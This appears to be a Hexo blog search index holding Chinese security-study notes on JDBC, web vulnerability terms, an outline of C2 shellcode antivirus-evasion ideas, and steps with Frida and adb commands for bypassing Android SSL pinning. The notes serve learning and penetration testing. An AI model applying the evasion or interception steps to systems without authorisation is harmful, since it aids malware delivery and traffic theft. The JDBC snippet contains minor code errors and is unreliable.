&#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Java基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaEE-JDBC</title>
      <link href="/2025/06/17/JavaEE-JDBC/"/>
      <url>/2025/06/17/JavaEE-JDBC/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaEE-JDBC"><a href="#JavaEE-JDBC" class="headerlink" title="JavaEE-JDBC"></a>JavaEE-JDBC</h1><h2 id="什么是-JDBC？"><a href="#什么是-JDBC？" class="headerlink" title="什么是 JDBC？"></a>什么是 JDBC？</h2><p>Java 数据库连接，（Java Database Connectivity，简称 JDBC）是 Java 语言中用来规范客户端程序如何来访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。JDBC 也是 Sun Microsystems 的商标。我们通常说的 JDBC 是面向关系型数据库的。</p><p>简而言之，JDBC 就是 JDK 提供的关于数据库操作的一套接口规范，不同数据库厂商来负责实现这个接口，完成指定的操作。</p><p>用程序和数据建立连接，分为三步骤：</p><ol><li><p>连接数据库</p></li><li><p>执行 SQL 语句</p></li><li><p>把查询到的结果集转换成 JAVA 对象</p></li></ol><p>安装 mysql-connector-java.jar 文件</p><p>下载地址（官网）：MySQL :: Download Connector&#x2F;J</p><p>（1）加载驱动程序（通过反射找到对应的 re 包）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载Oracle“驱动类” SPI</span></span><br><span class="line">Class.forName(<span class="string">&quot;oracle.jdbc.driver.OracleDriver&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//加载MySql驱动 SPI</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>)</span><br></pre></td></tr></table></figure><p>（2）获取数据库连接：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建“URL连接字符串”。格式：jdbc:oracle:thin:@ 主机名/IP : 端口号 ：服务名称</span></span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:oracle:thin:@ip:1521:sid&quot;</span>;  <span class="comment">//oracle</span></span><br><span class="line"><span class="comment">//jdbc:mysql://ip:3306:sid   //mysql</span></span><br><span class="line"><span class="comment">//jdbc:micronsoft:sqlserver://ip:1433:sid    //SqlServer</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建“用户名”</span></span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;scott&quot;</span>;</span><br><span class="line"><span class="comment">// 创建“密码”</span></span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 初始化“数据库连接对象”</span></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br></pre></td></tr></table></figure><p>（3）Statement 对象（对静态 sql 的执行）</p><p>Statement 对象可以用来执行 SQL 语句，使用 executeQuery 执行查询语句，返回结果集，使用 executeUpdate 执行增删改，返回操作的行数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> conn.createStatement();</span><br></pre></td></tr></table></figure><p>（4）结果 ResultSet 进行提取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users&quot;</span>;</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//取出值</span></span><br><span class="line"><span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">    <span class="type">int</span> id=rs.getInt(columnLabel:<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    String name=rs.getString(columnLabel:<span class="string">&quot;username&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JDBC 预编译</p><p>在 JDBC 中，预编译指的是使用 PreparedStatement 接口来执行 SQL 语句</p><ul><li>性能提升：预编译的 SQL 语句只需要解析一次，可以重复执行多次，减少了数据库解析 SQL 的时间。</li><li>参数化查询：预编译的 SQL 语句可以使用占位符（?）代替实际值，这使得相同的 SQL 语句可以使用不同的参数值执行。</li><li>防止 SQL 注入：预编译的 SQL 语句可以自动转义特殊字符，从而防止 SQL 注入攻击。</li></ul><p>创建预编译 Statement，并把 sql 语句传入，此时 sql 语句已与此 prepareStatement 绑定，所以执行语句时无需再把 sql 语句作为参数传入 execute ()。</p><p>定义预编译的 sql 语句，其中待填入的参数用？占位。注意，? 无关类型，不需要加分号之类。其具体数据类型在下面 setXX（）时决定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;insert into student(id,name,passwd) values(?,?,?)&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//填入具体参数。通过setXX(问号下标，数值）来为sql语句填入具体数据。注意：问号下标从1开始，setXX与数值类型有关，字符串就是setString（index，str）.</span></span><br><span class="line">ps.setInt(<span class="number">1</span>, id);</span><br><span class="line">ps.setString(<span class="number">2</span>, user);</span><br><span class="line">ps.setInt(<span class="number">3</span>, passwd);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Http</title>
      <link href="/2025/06/17/http-base/"/>
      <url>/2025/06/17/http-base/</url>
      
        <content type="html"><![CDATA[<h1 id="Http-和-Https数据包"><a href="#Http-和-Https数据包" class="headerlink" title="Http 和 Https数据包"></a>Http 和 Https数据包</h1><p>可以看此文章：<a href="https://www.runoob.com/w3cnote/http-vs-https.html">https://www.runoob.com/w3cnote/http-vs-https.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概念名词</title>
      <link href="/2025/06/17/Concept-name/"/>
      <url>/2025/06/17/Concept-name/</url>
      
        <content type="html"><![CDATA[<h1 id="概念名词"><a href="#概念名词" class="headerlink" title="概念名词"></a>概念名词</h1><h2 id="1，域名"><a href="#1，域名" class="headerlink" title="1，域名"></a>1，域名</h2><p>域名（Domain Name）是互联网中用于标识网站的名称，它是一串易于记忆的字符，代替了复杂的 IP 地址，使用户能够更方便地访问互联网上的资源。域名通过将用户输入的文字转换为相应的 IP 地址，帮助用户定位和访问目标网站。‌<br>例如：<a href="http://www.example.com/">www.example.com</a></p><ul><li>顶级域名（TLD）‌：这是域名的最后一部分，例如 “.com”、“.net” 或 “.org”。顶级域名通常代表不同的组织类型或地域。</li><li>二级域名（SLD）‌：紧接在顶级域名前的部分，例如 “example” 在 “example.com” 中就是二级域名。</li><li>‌子域名‌：位于二级域名前面，用于进一步划分域名。例如 “blog.example.com” 中的 “blog” 就是子域名。</li></ul><h3 id="域名发现对于安全测试的意义："><a href="#域名发现对于安全测试的意义：" class="headerlink" title="域名发现对于安全测试的意义："></a>域名发现对于安全测试的意义：</h3><p>某个主域的二级域名或者多级域名，在防御措施严密情况下无法直接拿下主域，那么就可以采用迂回战术拿下子域名，然后无限靠近主域。</p><p>例如：<a href="http://www.xxxxx.com/">www.xxxxx.com</a> 主域不存在漏洞，并且防御措施严密。<br>而二级域名 edu.xxxxx.com 存在漏洞，并且防护措施松散。</p><p>里面就可能存在漏洞，加以利用可以突破到主站的权限。<br>简单来说，多级域名收集的意义，就是一个网站找不到漏洞时，可以找跟它服务器相同的另一个多级域名上的漏洞，做旁路攻击。<br>这就是旁站入侵。</p><h2 id="2，DNS"><a href="#2，DNS" class="headerlink" title="2，DNS"></a>2，DNS</h2><p>DNS（Domain Name System）是互联网的一项核心服务，其主要功能是将方便记忆的域名（如 example.com）转换为计算机能够识别的 IP 地址（如 192.0.2.1）。这种映射关系使得用户无需记住复杂的数字地址，只需输入域名即可访问目标资源。</p><h3 id="本地-HOSTS-与-DNS-的关系"><a href="#本地-HOSTS-与-DNS-的关系" class="headerlink" title="本地 HOSTS 与 DNS 的关系"></a>本地 HOSTS 与 DNS 的关系</h3><p>本地 HOSTS 重定向解析 IP 地址，如果网络在解析 IP 地址的时候，ping 这个网站的时候，先到 hosts 文件去看看，有没有对域名对应的 IP 地址，没有的话再去 DNS 服务器上去解析。如果去绑定 IP 地址，可以用这个方法，或者修改 hosts 文件，就能让对方指到此 IP 地址上去，类似于钓鱼攻击。<br>hosts 文件所在的位置：C：\Windows\System32\drivers\etc\hosts</p><p>linux 文件所在位置：&#x2F;etc&#x2F;hosts</p><h3 id="CDN-是什么？与-DNS-的关系？"><a href="#CDN-是什么？与-DNS-的关系？" class="headerlink" title="CDN 是什么？与 DNS 的关系？"></a>CDN 是什么？与 DNS 的关系？</h3><p>CDN 的全称是 Content Delivery Network，即内容分发网络。CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p><p>CDN 作用： 访问的时候找一个网络最好，通讯最快的节点，访问网络时是访问一个节点，用来解决访问速度。</p><p>CDN 缺点： 由于有节点，访问网络时，请求的是一个节点，真实数据和网络相关核心不在节点上，节点相当于缓存。</p><p>两者之间关系： 更改 DNS 服务器，就相当于有可能访问到另一个节点。</p><h3 id="常见的-DNS-攻击"><a href="#常见的-DNS-攻击" class="headerlink" title="常见的 DNS 攻击"></a>常见的 DNS 攻击</h3><h4 id="域名劫持"><a href="#域名劫持" class="headerlink" title="域名劫持"></a>域名劫持</h4><p>通过采用黑客手段控制了域名管理密码和域名管理邮箱，然后将该域名的 NS 纪录指向到黑客可以控制的 DNS 服务器，然后通过在该 DNS 服务器上添加相应域名纪录，从而使网民访问该域名时，进入了黑客所指向的内容。</p><h4 id="缓存投毒"><a href="#缓存投毒" class="headerlink" title="缓存投毒"></a>缓存投毒</h4><p>利用控制 DNS 缓存服务器，把原本准备访问某网站的用户在不知不觉中带到黑客指向的其他网站上。</p><h4 id="DDOS-攻击"><a href="#DDOS-攻击" class="headerlink" title="DDOS 攻击"></a>DDOS 攻击</h4><p>一种攻击针对 DNS 服务器软件本身，通常利用 BIND 软件程序中的漏洞，导致 DNS 服务器崩溃或拒绝服务；另一种攻击的目标不是 DNS 服务器，而是利用 DNS 服务器作为中间的 “攻击放大器”，去攻击其它互联网上的主机，导致被攻击主机拒绝服务。</p><h4 id="DNS-欺骗"><a href="#DNS-欺骗" class="headerlink" title="DNS 欺骗"></a>DNS 欺骗</h4><p>DNS 欺骗就是攻击者冒充域名服务器的一种欺骗行为。</p><h2 id="3，HTTP-和-HTTPS-区别"><a href="#3，HTTP-和-HTTPS-区别" class="headerlink" title="3，HTTP 和 HTTPS 区别"></a>3，HTTP 和 HTTPS 区别</h2><ul><li>‌安全性‌：HTTP 是明文传输，HTTPS 通过加密保护数据。</li><li>‌证书‌：HTTPS 需要 CA 颁发的证书，而 HTTP 不需要。</li><li>HTTPS 由于加密和解密过程，可能比 HTTP 稍慢，但现代技术已大大缩小了这一差距。</li></ul><h2 id="4，后门"><a href="#4，后门" class="headerlink" title="4，后门"></a>4，后门</h2><p>后门：可以理解为攻击者，在得到相关的非法入侵后，留下后门文件，便于下次进行操作，拿到权限。<br>后门文件：网站后门 (webshell)，服务器后门等其他类型的后门。</p><p>关于后门需要了解哪些？（玩法，免杀）<br>玩法（要能够隐藏自己），免杀（网站有杀毒软件，大部分有杀后门功能，会检测并删除，免杀就是不被检测到）</p><h2 id="5，WEB"><a href="#5，WEB" class="headerlink" title="5，WEB"></a>5，WEB</h2><p>网站源码：分脚本类型、分应用方向<br>操作系统：windows、linux<br>中间件（搭建平台）：apache、iis、tomcat、nginx 等<br>数据库：access、mysql、mssql、oracle、sybase、db2、postsql 等</p><p><strong>WEB 相关安全漏洞</strong></p><p>1、SQL 注入</p><p>SQL 注入攻击的核心在于让 Web 服务器执行攻击者期望的 SQL 语句，以便得到数据库中的感兴趣的数据或对数据库进行读取、修改、删除、插入等操作，达到其邪恶的目的。</p><p>2、XSS 攻击</p><p>XSS 攻击的核心是将可执行的前端脚本代码（一般为 JavaScript）植入到网页中，听起来比较拗口，用大白话说就是攻击者想让你的浏览器执行他写的 JS 代码</p><p>3、CSRF 攻击</p><p>CSRF，跨站请求伪造，其核心思想在于，在打开 A 网站的情况下，另开 Tab 页面打开恶意网站 B，此时在 B 页面的 “唆使” 下，浏览器发起一个对网站 A 的 HTTP 请求</p><p>4、DDoS 攻击</p><p>DDoS 全称 Distributed Denial of Service：分布式拒绝服务攻击。是拒绝服务攻击的升级版。拒绝攻击服务顾名思义，让服务不可用。</p><p>5、DNS 劫持</p><p>6、JSON 劫持</p><p>JSON 是一种轻量级的数据交换格式，而劫持就是对数据进行窃取（或者应该称为打劫、拦截比较合适。恶意攻击者通过某些特定的手段，将本应该返回给用户的 JSON 数据进行拦截，转而将数据发送回给恶意攻击者</p><p>7、暴力破解</p><p>8、信息泄露</p><p>由于 Web 服务器或应用程序没有正确处理一些特殊请求，泄露 Web 服务器的一些敏感信息，如用户名、密码、源代码、服务器信息、配置信息等。</p><p>9、目录遍历漏洞</p><p>攻击者向 Web 服务器发送请求，通过在 URL 中或在有特殊意义的目录中附加 ..&#x2F;、或者附加 ..&#x2F; 的一些变形（如 ..\ 或 ..&#x2F;&#x2F; 甚至其编码），导致攻击者能够访问未授权的目录，以及在 Web 服务器的根目录以外执行命令。</p><p>10，命令执行漏洞</p><p>命令执行漏洞是通过 URL 发起请求，在 Web 服务器端执行未授权的命令，获取系统信息、篡改系统配置、控制整个系统、使系统瘫痪等。</p><p>11、文件上传漏洞</p><p>如果对文件上传路径变量过滤不严，并且对用户上传的文件后缀以及文件类型限制不严，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。</p><p>12、其他漏洞</p><p>SSLStrip 攻击<br>OpenSSL Heartbleed 安全漏洞<br>CCS 注入漏洞<br>证书有效性验证漏洞<br>13、业务漏洞</p><p>一般业务漏洞是跟具体的应用程序相关，比如参数篡改（连续编号 ID &#x2F; 订单、1 元支付）、重放攻击（伪装支付）、权限控制（越权操作）等。</p><p>14、框架或应用漏洞</p><p>15，XEE 漏洞</p><p>XXE 漏洞全称 XML External Entity Injection 即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起 Dos 攻击等危害。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C2远控免杀</title>
      <link href="/2025/06/17/C2%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80/"/>
      <url>/2025/06/17/C2%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="C2远控免杀"><a href="#C2远控免杀" class="headerlink" title="C2远控免杀"></a>C2远控免杀</h1><p>免杀思路：<br>1，Shellcode自写打乱 - 针对杀毒不认识<br>2，Shellcode加密混淆 - 针对找到但是不知道<br>3，Shellcode分离隐藏 - 针对杀毒找不到<br>3，Shellcode注入回调 - 针对绕死干扰杀毒</p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP双项认证</title>
      <link href="/2025/06/17/APP%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/"/>
      <url>/2025/06/17/APP%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="APP单项认证"><a href="#APP单项认证" class="headerlink" title="APP单项认证"></a>APP单项认证</h1><h2 id="常见的-Android-安全工具"><a href="#常见的-Android-安全工具" class="headerlink" title="常见的 Android 安全工具"></a>常见的 Android 安全工具</h2><ul><li>移动安全框架 (MobSF) 是一种自动化的一体化移动应用程序<br>(Android&#x2F;iOS&#x2F;Windows) 渗透测试、恶意软件分析和安全评估框架，能够执行静态和<br>动态分析。MobSF 支持移动应用程序二进制文件（APK、XAPK、IPA 和 APPX）以及压<br>缩源代码，并提供 REST API 以与您的 CI&#x2F;CD 或 DevSecOps 管道无缝集成。动态<br>分析器可帮助您执行运行时安全评估和交互式仪器测试。</li></ul><p>-Mobexler 是基于 Elementary OS 的定制虚拟机，旨在帮助进行 Android 和 iOS 应<br>用程序的渗透测试。Mobexler 预装了各种开源工具，脚本，黑客必备软件等，这些都是<br>安全测试 Android 和 iOS 应用程序所必需的。<br><a href="https://mobexler.com/">https://mobexler.com/</a></p><h2 id="APP-双向认证绕过"><a href="#APP-双向认证绕过" class="headerlink" title="APP 双向认证绕过"></a>APP 双向认证绕过</h2><p>–r0capture 仅限安卓平台，测试安卓 7、8、9、10、11 可用 ；无视所有证书校验或<br>绑定，不用考虑任何证书的事情；通杀 TCP&#x2F;IP 四层模型中的应用层中的全部协议；通杀<br>协议包括：Http,WebSocket,Ftp,Xmpp,Imap,Smtp,Protobuf 等、及它们的 SSL<br>版本；通杀所有应用层框架，包括 HttpUrlConnection、Okhttp1&#x2F;3&#x2F;4、<br>Retrofit&#x2F;Volley 等等；无视加固，不管是整体壳还是二代壳或 VMP，不考虑加固事<br>情</p><p>–Firda 是一款易用的跨平 Hook 工具， Java 层到 Native 层的 Hook 无所不能，是<br>一种 动态 的插桩工具，可以插入代码到原生 App 的内存空间中，动态的去监视和修改<br>行为，原生平台包括 Win、Mac、Linux、Android、iOS 全平台。</p><h3 id="方案-1-Firda-rOcapture-WireShark（抖音）"><a href="#方案-1-Firda-rOcapture-WireShark（抖音）" class="headerlink" title="方案 1:Firda+rOcapture+WireShark（抖音）"></a>方案 1:Firda+rOcapture+WireShark（抖音）</h3><p><a href="https://github.com/r0ysue/rOcapture">https://github.com/r0ysue/rOcapture</a><br>模拟器执行：.&#x2F;frida-server<br>获取包名：ls&#x2F;data&#x2F;data 或 Apk 资源器查看<br>python rOcapture.py -U -f 包名 -p xxxx.pcap</p><h3 id="方案-2-Firda-HOOK-JS-BurpSuite"><a href="#方案-2-Firda-HOOK-JS-BurpSuite" class="headerlink" title="方案 2:Firda+HOOK-JS+BurpSuite"></a>方案 2:Firda+HOOK-JS+BurpSuite</h3><p><a href="https://github.com/apkunpacker/FridaScripts">https://github.com/apkunpacker/FridaScripts</a><br>模拟器执行：.&#x2F;frida-server<br>本地执行：frida-U-f 包名 - 1hookjs 文件</p><h3 id="方案-3：导入证书"><a href="#方案-3：导入证书" class="headerlink" title="方案 3：导入证书"></a>方案 3：导入证书</h3><p>利用场景：能反编译，有证书文件<br>1、解压获取 apk 的证书文件<br>2、反编译后得到证书文件的密钥<br>3、Burp 导入证书后实现对应抓包</p><p><a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a><br>1、本地安装 Frida<br>pip install frida<br>pip install frida-tools</p><p>ADB 就是连接 Android 手机与 PC 端的桥梁，所以 ADB 又称为安卓调试桥（注意：是安卓，不是 iOS），可以让用户在电脑上对手机进行全面的操作</p><p><a href="https://dl.google.com/android/repository/platform-tools-latest-windows.zip">https://dl.google.com/android/repository/platform-tools-latest-windows.zip</a></p><p>并配置环境变量</p><p>2、模拟器安装 Frida<br>注意：版本要与本地 Frida 一致<br>下载：<a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a><br>真机：ARM 版本及位数 模拟器：无 ARM 的位数<br>getprop ro.product.cpu.abi &#x2F;&#x2F; 查看版本，可使用 termux</p><p>本机操作：<br>adb connect 127.0.0.1:7555<br>adb root<br>adb push frida-server &#x2F;data&#x2F;local<br>adb shell<br>cd &#x2F;data&#x2F;local&#x2F;tmp&#x2F;<br>chmod 777 frida-server<br>.&#x2F;frida-server<br>模拟器执行：.&#x2F;frida-server<br>本地执行：frida-U-f 包名 - 1hookjs 文件</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP单项认证</title>
      <link href="/2025/06/17/APP%E5%8D%95%E9%A1%B9%E8%AE%A4%E8%AF%81/"/>
      <url>/2025/06/17/APP%E5%8D%95%E9%A1%B9%E8%AE%A4%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="APP单项认证"><a href="#APP单项认证" class="headerlink" title="APP单项认证"></a>APP单项认证</h1><h2 id="单项认证的绕过："><a href="#单项认证的绕过：" class="headerlink" title="单项认证的绕过："></a>单项认证的绕过：</h2><p>没有限制过滤的抓包问题：<br>1、抓不到-工具证书没配置好<br>2、抓不到-app走的不是http&#x2F;s<br>有限制过滤的抓包问题：<br>3、抓不到-反模拟器调试<br>4、抓不到-反代理VPN<br>5、抓不到-反证书检验<br>做移动安全测试时，设置好了代理，但抓不到数据包<br>反抓包Demo：<a href="https://github.com/AndroidAppSec/vuls">https://github.com/AndroidAppSec/vuls</a><br>反调试Demo：<a href="https://github.com/lamster2018/EasyProtector">https://github.com/lamster2018/EasyProtector</a> </p><p>防护手段：<br>1、反模拟器：禁用模拟器进行调试访问 </p><p>2、反证书检验：SSL证书绑定（单向校验和双向校验）<br>单项校验-客户端校验服务端的证书。<br>双向认证-客户端不仅仅要校验服务端的证书，<br>也会在app内放一张证书；服务端也会检验客户端里的证书。 </p><p>3、反代理VPN：代理检测、VPN检测、发包框架强制不走代理<br>配置代理后无法访问，数据异常等<br>连接VPN节点后无法访问，数据异常等<br>配置代理后正常访问且无任何异常，但无数据包 </p><p>绕过手段：<br>-反模拟器：（某社交相亲）<br>1、用真机<br>2、模拟器模拟真机<br>3、逆向删反代码重打包 </p><p>-反证书检验：（某游戏营地）<br>1、单向-XP框架<br>2、双向<br>3、逆向删反代码重打包<br>XP框架安装：<br><a href="https://blog.csdn.net/weixin_49941977/article/details/121318015">https://blog.csdn.net/weixin_49941977/article/details/121318015</a><br>-反代理：<br>1、使用电脑端的proxfiter代理</p><p>以 MuMu Android12 为例：</p><p>1，安装 mask 面具：</p><p><a href="https://mumu.163.com/help/20240202/35044_1136675.html#a2">https://mumu.163.com/help/20240202/35044_1136675.html#a2</a></p><p>2，Lsposed</p><p><a href="https://github.com/LSPosed/LSPosed/releases/tag/v1.9.2">https://github.com/LSPosed/LSPosed/releases/tag/v1.9.2</a></p><p>并安装两个插件</p><p><a href="https://github.com/scopion/xposed-ssl-pinning">https://github.com/scopion/xposed-ssl-pinning</a></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87.png"></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>app base</title>
      <link href="/2025/06/17/app-base/"/>
      <url>/2025/06/17/app-base/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识-APP架构"><a href="#基础知识-APP架构" class="headerlink" title="基础知识-APP架构"></a>基础知识-APP架构</h1><p>APP 应用开发架构：</p><p>1，原生（java）开发</p><p>安卓一般使用 java 语言开发，当然也有使用 kotlin 语言进行开发。</p><p>2，使用 H5 语言开发</p><p>H5 页面可以在任何支持 HTML5 标准的浏览器上运行，无需针对不同的操作系统进行开发。</p><p>易于传播：H5 页面可以通过链接分享，方便用户在社交媒体等平台上进行传播。</p><p>开发成本低：相较于 App 和小程序，H5 页面的开发成本较低，因为可以使用一套代码实现跨平台访问</p><p>3，使用 flutter 开发</p><p>flutter 是谷歌推出的一款 UI 框架，使用 dart 语言进行开发，支持跨平台 weight 渲染直接操作硬件层，体验可媲美原生</p><p>4，常规 Web 开发</p><p>Web App 软件开发简单来说，就是开发一个网站，然后加入 app 的壳，内容都是 app 内的网页展示，受制于网页技术本身，可实现的功能少，而且每次点开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多容易卡死，体验差</p><p>1，APP - 开发架构 - 原生态 - IDEA</p><p>安全影响：反编译 &amp; 抓包 &amp; 常规测试（逆向的角度去分析逻辑设计安全）</p><p>2，APP - 开发框架 - H5&amp;Vue-HBuilderX</p><p>安全影响：API&amp;JS 框架安全问题 &amp; js 前端测试</p><p>3，WX - 小程序 - 开发架构 - Web 封装 - 平台</p><p>安全影响：常规 web 安全测试</p><p>4，WX - 小程序 - 开发框架 - H5&amp;Vue-HBuilderX</p><p>安全影响：API&amp;JS 框架安全问题 &amp; JS 前端测试</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
